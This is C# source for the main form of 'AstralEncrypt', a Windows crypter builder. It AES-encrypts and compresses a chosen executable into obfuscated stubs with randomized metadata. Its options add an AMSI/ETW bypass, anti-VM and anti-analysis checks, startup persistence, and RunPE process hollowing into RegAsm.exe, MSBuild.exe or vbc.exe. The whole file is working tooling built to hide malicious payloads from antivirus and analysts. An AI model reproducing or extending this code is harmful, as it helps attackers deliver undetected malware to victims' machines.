using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using AstralEncrypt.Fonction;

namespace AstralEncrypt
{
    public partial class Form1 : Form
    {
        private const int WmNclbuttondown = 0xA1;
        private const int HtCaption = 0x2;

        public Form1()
        {
            InitializeComponent();
            // Ajouter les événements MouseDown et MouseMove pour déplacer le formulaire avec la souris
            MouseDown += Form1_MouseDown;
            Thread thread = new Thread(WhileGenerateKey);
            thread.Start();
        }

        private void Form1_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                Capture = false;
                Message msg = Message.Create(this.Handle, WmNclbuttondown, (IntPtr)HtCaption, (IntPtr)0);
                WndProc(ref msg);
            }
        }

        private void guna2Button_exit_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }

        private void guna2GradientButton_load_file_Click(object sender, EventArgs e)
        {
            using (var openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = @"Executable (*.exe)|*.exe";
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    guna2TextBox_filename.Text = openFileDialog.FileName;
                    guna2TextBox_filename.Enabled = true;
                }
                else
                {
                    guna2TextBox_filename.Enabled = true;
                }
            }
        }

        private void WhileGenerateKey()
        {
            while (true)
            {
                guna2TextBox_password_stub.Text = RandomString.RandomStringGenerator.Generate(256);
            }
        }

        private void guna2GradientButton_encrypt_Click(object sender, EventArgs e)
        {
            string filenameExe = RandomString.RandomStringGenerator.Generate(5) + ".exe";
            string stub = Deplacer.CopyLireStubLoaderStub("Stub.txt");
            string loaderStub = Deplacer.CopyLireStubLoaderStub("LoaderStub.txt");
            string password = guna2TextBox_password_stub.Text;
            string fullPathFileName = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\" + filenameExe;
            byte[] payloadFileLoadEncComp =
                Encryptions.AES_Encrypt(Encryptions.Compress(File.ReadAllBytes(guna2TextBox_filename.Text)), password);
            string base64PayloadEncComp = Convert.ToBase64String(payloadFileLoadEncComp);

            stub = ReplaceStub(stub);
            stub = stub.Replace("#BASE64_STUB#", base64PayloadEncComp);
            stub = stub.Replace("#PASSWORD_STUB#", password);

            try
            {
                Obfuscation.ObfuscateStub(stub, fullPathFileName, guna2TextBox1_icon.Text);

                loaderStub = ReplaceLoaderStub(loaderStub, fullPathFileName);

                Obfuscation.ObfuscateStub(loaderStub, fullPathFileName, guna2TextBox1_icon.Text);
                MessageBox.Show(@"Done !,Save in : " + fullPathFileName, @"by amn...",
                    MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show(@"Erreur : la compilations a echouee : " + ex.Message + ex.InnerException, @"by amn...",
                    MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private string ReplaceStub(string stub)
        {
            //Assembly
            stub = Assembly(stub);
            //Amsi
            string passwordAmsi = guna2TextBox_password_stub.Text;
            string filenameAmsiEtw = "AmsiEtw.exe";
            Obfuscation.ObfuscateExe(Deplacer.CopyLireComposants(filenameAmsiEtw), filenameAmsiEtw);
            byte[] amsiEtwEncComp =
                Encryptions.AES_Encrypt(Encryptions.Compress(File.ReadAllBytes(filenameAmsiEtw)), passwordAmsi);
            string base64AmsiEtw = Convert.ToBase64String(amsiEtwEncComp);

            stub = stub.Replace("#BASE64_AMSI#", base64AmsiEtw);
            stub = stub.Replace("#PASSWORD_AMSI#", passwordAmsi);

            return stub;
        }

        private string ReplaceLoaderStub(string loaderstub, string fullPathFileName)
        {
            loaderstub = Assembly(loaderstub);

            byte[] stubBytes = File.ReadAllBytes(fullPathFileName);
            if (File.Exists(fullPathFileName))
                File.Delete(fullPathFileName);
            string passwordStubBytes = guna2TextBox_password_stub.Text;
            byte[] stubBytesEncComp = Encryptions.AES_Encrypt(Encryptions.Compress(stubBytes), passwordStubBytes);
            string base64StubBytesEncComp = Convert.ToBase64String(stubBytesEncComp);

            loaderstub = loaderstub.Replace("#STUB_LOAD_BASE64#", base64StubBytesEncComp);
            loaderstub = loaderstub.Replace("#PASSWORD_LOAD_BASE64#", passwordStubBytes);

            loaderstub = Injection(loaderstub);
            loaderstub = LoadRunPeInStub(loaderstub);
            if (guna2CheckBox_startup.Checked)
            {
                loaderstub = loaderstub.Replace("#STARTUP_FALSE#", "#STARTUP_TRUE#");
            }

            if (guna2CheckBox1_anti_vm.Checked)
            {
                loaderstub = loaderstub.Replace("#ANTI_FALSE#", "#ANTI_TRUE#");
                string filenameAntiVm = "Anti_Analysis.exe";
                Obfuscation.ObfuscateExe(Deplacer.CopyLireComposants(filenameAntiVm),filenameAntiVm);
                string passwordAntiAnalysis = guna2TextBox_password_stub.Text;
                byte[] antiAnalysis =
                    Encryptions.AES_Encrypt(Encryptions.Compress(File.ReadAllBytes(filenameAntiVm)),passwordAntiAnalysis);
                string base64AntiAnalysis = Convert.ToBase64String(antiAnalysis);

                loaderstub = loaderstub.Replace("#BASE64_ANTI_ANALYSIS#", base64AntiAnalysis);
                loaderstub = loaderstub.Replace("#PASSWORD_ANTI_ANALYSIS#", passwordAntiAnalysis);

            }

            return loaderstub;
        }

        private string LoadRunPeInStub(string loaderStub)
        {
            string fileNameRunPe = "RunPE.dll";
            string passwordRunPeBytes = guna2TextBox_password_stub.Text;
            byte[] stubBytesEncComp = Encryptions.AES_Encrypt(
                Encryptions.Compress(Obfuscation.Obfuscate_dll(Deplacer.CopyLireComposants(fileNameRunPe), fileNameRunPe)),
                passwordRunPeBytes);
            string base64RunPe = Convert.ToBase64String(stubBytesEncComp);
            loaderStub = loaderStub.Replace("#RUNPE#", base64RunPe);
            loaderStub = loaderStub.Replace("#PASSWORD_RUNPE#", passwordRunPeBytes);
            loaderStub = loaderStub.Replace("#NAMESPACE#", Obfuscation.NameSpaceRunpe);
            loaderStub = loaderStub.Replace("#CLASSE", Obfuscation.ClassRunpe);
            loaderStub = loaderStub.Replace("#METHODS", Obfuscation.MethodRunpe);
            return loaderStub;
        }

        private string Injection(string loaderstub)
        {
            if (guna2RadioButton_RegAsm.Checked)
            {
                loaderstub = loaderstub.Replace("#Injection", "RegAsm.exe");
            }
            else if (guna2RadioButton1_msBuild.Checked)
            {
                loaderstub = loaderstub.Replace("#Injection", "MSBuild.exe");
            }
            else if (guna2RadioButton_vbc.Checked)
            {
                loaderstub = loaderstub.Replace("#Injection", "vbc.exe");
            }

            return loaderstub;
        }

        private string Assembly(string stub)
        {
            Random r = new Random();
            string randomString = RandomString.RandomStringGenerator.Generate(50);
            stub = stub.Replace("#TITLE", randomString);
            stub = stub.Replace("#DESCRIPTIONS", randomString);
            stub = stub.Replace("#COMPANY", randomString);
            stub = stub.Replace("#PRODUCT", randomString);
            stub = stub.Replace("#COPYRIGHT", randomString);
            stub = stub.Replace("#TRADEMARK", randomString);
            stub = stub.Replace("997", r.Next(1, 1000).ToString());
            stub = stub.Replace("998", r.Next(1, 1000).ToString());
            stub = stub.Replace("999", r.Next(1, 1000).ToString());
            stub = stub.Replace("1000", r.Next(1, 1000).ToString());
            return stub;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
        }

        private void guna2GradientButton1_icon_Click(object sender, EventArgs e)
        {
            using (var openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = @"Executable (*.ico)|*.ico";
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    guna2TextBox1_icon.Text = openFileDialog.FileName;
                    guna2TextBox1_icon.Enabled = true;
                }
                else
                {
                    guna2TextBox1_icon.Enabled = true;
                }
            }
        }

        private void guna2Button1_hide_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }
    }
}